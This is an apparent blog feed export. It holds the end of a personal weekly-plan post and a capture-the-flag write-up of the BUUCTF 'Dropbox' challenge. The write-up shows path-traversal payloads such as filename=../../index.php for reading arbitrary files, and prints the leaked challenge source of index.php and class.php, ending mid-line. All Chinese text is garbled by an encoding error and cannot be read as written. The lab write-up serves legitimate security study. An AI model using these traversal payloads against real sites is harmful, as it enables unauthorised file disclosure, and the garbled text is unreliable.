·ï¼Œè‡³å°‘æˆ‘æ„Ÿæ‚Ÿå¾ˆå¤šã€‚</p><p>2.æ˜æ—¥æ–¹èˆŸ60æŠ½æ–°å‡ºçš„ä¸¤ä¸ªå…­æ˜Ÿå…¨éƒ¨æ‹¿ä¸‹</p><p>æ€»ç»“ï¼šä¹‹å‰æœ€æ¬§çš„æ± å­å°±æ˜¯è¿‡å¹´é™å®šæ± ï¼Œæ‰€ä»¥æ‰“ç®—å°†æ”’çš„æŠ½éƒ½ç”¨æ¥æŠ½è¿‡å¹´é™å®šæ± ï¼Œç„¶åæŠ½å‡ºæ–°å‡ºçš„é™å®šåå°±é€€æ¸¸ï¼Œä¹Ÿç®—æ˜¯ä¸€ç§æœ‰å§‹æœ‰ç»ˆçš„æµªæ¼«å§ï¼ˆè‡ªå·±è§‰å¾—ï¼‰ï¼Œæ˜Ÿé“æœ€å–œæ¬¢çš„è§’è‰²å°±æ˜¯å¡å¤«å¡ï¼Œæ‰€ä»¥åœ¨æŠ½åˆ°å¡å¤«å¡åå°±é€€æ¸¸äº†ï¼ŒæŠ½çš„æ—¶å€™æ²¡æœ‰æ­ªï¼Œå°±å¾ˆniceï¼ï¼ï¼åŸç¥æŠ½åˆ°é—²äº‘ä¹‹åä¹Ÿé€€å‘äº†ï¼Œé—²äº‘ä¹Ÿå¥½å–œæ¬¢ï¼Œè€Œä¸”å±…ç„¶æ˜¯æ­ªäº†åˆ»å¸ˆå‚…å10è¿ç›´æ¥å‡ºçš„ï¼Œå±å®ç»™æˆ‘æƒŠè®¶åˆ°äº†ã€‚è¿™ä¸‰ä¸ªæ¸¸æˆéƒ½æ˜¯æˆ‘å¤§å­¦æ¥è§¦çš„ï¼Œéƒ½ä»¥æˆ‘æœ€ç†æƒ³çš„ç»“å±€ç»“æŸäº†ä¸ä»–ä»¬çš„ç›¸é‡ï¼Œä¹Ÿç®—æ˜¯æ— æ‚”äº†ï¼Œè™½ç„¶ä»–ä»¬ç¡®å®ç»™æˆ‘å¸¦æ¥äº†å¾ˆå¤šçš„å¿«ä¹ï¼Œä½†æ˜¯ç»ˆç©¶æ— æ³•ä¿ƒè¿›æˆ‘å®Œæˆæˆ‘çš„ç›®æ ‡ï¼Œæ‰€ä»¥è¿˜æ˜¯ç»“æŸä¸ä»–ä»¬çš„é™ªä¼´å§ï¼Œæˆ‘è¦ä»¥ä¸€äººä¹‹èº«æŠµè¾¾æˆ‘ç†æƒ³çš„å·…å³°ï¼ï¼ï¼</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“:"></a>æ€»ç»“:</h2><p>æˆ‘å¿ƒè‡ªæµ®å°˜ï¼Œä½†æ±‚ä¸€æ–¹å‡€ã€‚</p><p>å¤©åœ°é™ä¸ºäººï¼Œæˆ‘æ„é€¢é«˜å¤„ï¼</p><h2 id="ç¬¬äºŒå‘¨"><a href="#ç¬¬äºŒå‘¨" class="headerlink" title="ç¬¬äºŒå‘¨:"></a>ç¬¬äºŒå‘¨:</h2><h3 id="Todo"><a href="#Todo" class="headerlink" title="Todo:"></a>Todo:</h3><p>1.BUUCTFç¬¬ä¸‰é¢é¢˜ç›®å…¨éƒ¨åˆ·å®Œ(9é“é¢˜ï¼Œå‘¨ä¸€ï¼Œå‘¨äºŒï¼Œå‘¨ä¸‰)</p><p>2.[ç¬¬äºŒå±ŠN1CTF Junior]zakoå¤ç°ï¼ˆå‘¨å››ï¼‰</p><p>3.[L3HCTF 2024]intractable problemï¼ˆå‘¨äº”ï¼‰</p><p>4.å¥èº«4æ¬¡</p><p>5.å®Œæˆä»»åŠ¡æ¸…å•å†…å®¹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</title>
    <link href="/2024/02/03/2024-2-3-Dropbox/"/>
    <url>/2024/02/03/2024-2-3-Dropbox/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><h3 id="ç™»å½•ç•Œé¢åå‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œç»è¿‡æµ‹è¯•åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶"><a href="#ç™»å½•ç•Œé¢åå‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œç»è¿‡æµ‹è¯•åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" class="headerlink" title="ç™»å½•ç•Œé¢åå‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œç»è¿‡æµ‹è¯•åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶:"></a>ç™»å½•ç•Œé¢åå‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ ï¼Œç»è¿‡æµ‹è¯•åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶:</h3><p><img src="/images/2024-2-3-Dropbox/image-20231122084336631.png" alt="image-20231122084336631"></p><h3 id="å­˜åœ¨ä¸‹è½½ï¼Œæˆ‘ä»¬ç‚¹å‡»ä»¥åè¿˜æ˜¯åœç•™äºå½“å‰çš„index-phpç•Œé¢ï¼Œä½¿ç”¨BPæŠ“åŒ…æ‹¦æˆªä¹‹åï¼Œå‘ç°å­˜åœ¨download-phpï¼š"><a href="#å­˜åœ¨ä¸‹è½½ï¼Œæˆ‘ä»¬ç‚¹å‡»ä»¥åè¿˜æ˜¯åœç•™äºå½“å‰çš„index-phpç•Œé¢ï¼Œä½¿ç”¨BPæŠ“åŒ…æ‹¦æˆªä¹‹åï¼Œå‘ç°å­˜åœ¨download-phpï¼š" class="headerlink" title="å­˜åœ¨ä¸‹è½½ï¼Œæˆ‘ä»¬ç‚¹å‡»ä»¥åè¿˜æ˜¯åœç•™äºå½“å‰çš„index.phpç•Œé¢ï¼Œä½¿ç”¨BPæŠ“åŒ…æ‹¦æˆªä¹‹åï¼Œå‘ç°å­˜åœ¨download.phpï¼š"></a>å­˜åœ¨ä¸‹è½½ï¼Œæˆ‘ä»¬ç‚¹å‡»ä»¥åè¿˜æ˜¯åœç•™äºå½“å‰çš„index.phpç•Œé¢ï¼Œä½¿ç”¨BPæŠ“åŒ…æ‹¦æˆªä¹‹åï¼Œå‘ç°å­˜åœ¨download.phpï¼š</h3><p><img src="/images/2024-2-3-Dropbox/image-20231122084529636.png" alt="image-20231122084529636"></p><p>åœ¨download.phpä¸‹å­˜åœ¨filenameä¼ å‚ï¼Œä¸‹è½½çš„æ–‡ä»¶å†…å®¹ä¼šå­˜åœ¨äºå“åº”ç•Œé¢ä¸­ï¼ŒçŒœæµ‹å¯ä»¥ä½¿ç”¨è¯¥å‚æ•°å®ç°ä»»æ„æ–‡ä»¶è¯»å–.</p><h3 id="è¯»å–index-php"><a href="#è¯»å–index-php" class="headerlink" title="è¯»å–index.php:"></a>è¯»å–index.php:</h3><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Dropbox/image-20231122084805820.png" alt="image-20231122084805820"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=../index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Dropbox/image-20231122084840645.png" alt="image-20231122084840645"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=../../index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Dropbox/image-20231122090200880.png" alt="image-20231122090200880"></p><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br><br>&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;<br>&lt;title&gt;ç½‘ç›˜ç®¡ç†&lt;/title&gt;<br><br>&lt;head&gt;<br>    &lt;link href=<span class="hljs-string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;link href=<span class="hljs-string">&quot;static/css/panel.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;<br>    &lt;script src=<span class="hljs-string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;nav aria-label=<span class="hljs-string">&quot;breadcrumb&quot;</span>&gt;<br>    &lt;ol <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">breadcrumb</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>&quot;&gt;ç®¡ç†é¢æ¿&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">breadcrumb</span>-<span class="hljs-title">item</span> <span class="hljs-title">active</span>&quot;&gt;&lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">fileInput</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">fileLabel</span>&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/<span class="hljs-title">label</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">li</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">active</span> <span class="hljs-title">ml</span>-<span class="hljs-title">auto</span>&quot;&gt;&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;#&quot;&gt;ä½ å¥½ &lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">username</span>&#x27;]?&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">li</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">ol</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">nav</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">fileInput</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">hidden</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">top</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">toast</span>-<span class="hljs-title">container</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">include</span> &quot;<span class="hljs-title">class</span>.<span class="hljs-title">php</span>&quot;;</span><br><span class="hljs-class"></span><br><span class="hljs-class">$<span class="hljs-title">a</span> = <span class="hljs-title">new</span> <span class="hljs-title">FileList</span>($<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">sandbox</span>&#x27;]);</span><br><span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Name</span>();</span><br><span class="hljs-class">$<span class="hljs-title">a</span>-&gt;<span class="hljs-title">Size</span>();</span><br><span class="hljs-class">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="è¯»å–å…¶ä»–phpæ–‡ä»¶æºç "><a href="#è¯»å–å…¶ä»–phpæ–‡ä»¶æºç " class="headerlink" title="è¯»å–å…¶ä»–phpæ–‡ä»¶æºç :"></a>è¯»å–å…¶ä»–phpæ–‡ä»¶æºç :</h3><h5 id="class-php"><a href="#class-php" class="headerlink" title="class.php:"></a>class.php:</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;dropbox&quot;</span>;<br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>    <span class="hljs-comment">// ç±»è¢«ç”³è¯·æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œä½†ä¸å½±å“ä¹‹åå¯¹å˜é‡çš„èµ‹å€¼</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<span class="hljs-comment">//è·å–å…¨å±€å˜é‡$db</span><br>        <span class="hljs-comment">// ä½¿å½“å‰ç±»çš„$dbå˜é‡ä¸ºå…¨å±€å˜é‡$dbçš„å€¼</span><br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_exist</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>();<br>        <span class="hljs-variable">$count</span> = <span class="hljs-variable">$stmt</span>-&gt;num_rows;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify_user</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">user_exist</span>(<span class="hljs-variable">$username</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$password</span> . <span class="hljs-string">&quot;SiAchGHmFx&quot;</span>);<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-variable">$username</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$expect</span>);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$expect</span>) &amp;&amp; <span class="hljs-variable">$expect</span> === <span class="hljs-variable">$password</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">// é­”æœ¯æ–¹æ³•ç”¨äºè§¦å‘close()å‡½æ•°ï¼Œ$this-&gt;db= new File();</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$filenames</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$path</span>);<br><br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-variable">$filenames</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$filenames</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filenames</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br>            <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span> . <span class="hljs-variable">$filename</span>);<br>            <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;files, <span class="hljs-variable">$file</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()] = <span class="hljs-keyword">array</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;<br>        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$value</span>) . <span 